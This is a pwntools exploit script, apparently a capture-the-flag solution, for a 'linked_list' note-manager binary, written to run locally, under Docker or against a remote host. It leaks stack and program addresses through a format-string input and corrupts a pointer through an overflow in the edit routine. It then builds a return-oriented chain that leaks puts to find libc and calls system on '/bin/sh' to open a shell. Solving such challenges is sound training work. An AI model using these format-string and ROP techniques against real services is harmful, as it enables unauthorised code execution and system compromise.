#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('linked_list')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
brva 0x19A5  
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def add(idx, name, number, etc):
    io.sendlineafter(b":", b"1")
    io.sendlineafter(b":", str(idx).encode())
    io.sendafter(b":", name)
    io.sendafter(b":", number)
    io.sendafter(b":", etc)

def delete(idx):
    io.sendlineafter(b":", b"2")
    io.sendlineafter(b":", str(idx).encode()) 

def show(idx):
    io.sendlineafter(b":", b"3")
    io.sendlineafter(b":", str(idx).encode()) 

def edit(idx, new_idx, name, number, etc):
    io.sendlineafter(b":", b"4")
    io.sendlineafter(b":", str(idx).encode())
    io.sendlineafter(b":", str(new_idx).encode())
    io.sendafter(b":", name)
    io.sendafter(b":", number)
    io.sendafter(b":", etc)

def solve():

    io.sendline(b"%p.%16$p")
    io.recvuntil(b"?: ")
    leaks = io.recvline().split(b".")
    stack = int(leaks[0], 16) + 0x100 - 0x116
    pie_leak = int(leaks[1][:-37], 16)
    exe.address = pie_leak - 0x1a50
    info("stack: %#x", stack)
    info("elf base: %#x", exe.address)

    add(1337, b"A"*8, b"B"*8, b"C"*8)
    edit(1337, 1337, b"A"*8, b"B"*8, b"C"*0x100 + p64(stack))

    new_idx = exe.sym["main"]+242
    pop_rdi = exe.address + 0x1ab3 # pop rdi; ret;

    edit(new_idx, pop_rdi, p64(exe.got["puts"]) + p64(exe.plt["puts"]), p64(exe.sym["main"]), b"A"*8)
    io.recvuntil(b"object\n")
    puts = u64(io.recv(6).ljust(8, b"\x00"))
    libc.address = puts - 0x875a0
    info("libc base: %#x", libc.address)

    sh = libc.address + 0x1b75aa
    system = libc.address + 0x55410
    ret = pop_rdi + 1

    io.sendline(b"pwned!")
    edit(1337, 1337, b"A"*8, b"B"*8, b"C"*0x100 + p64(stack - 0x10))
    edit(new_idx, pop_rdi, p64(sh) + p64(ret), p64(system), b"A"*8)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

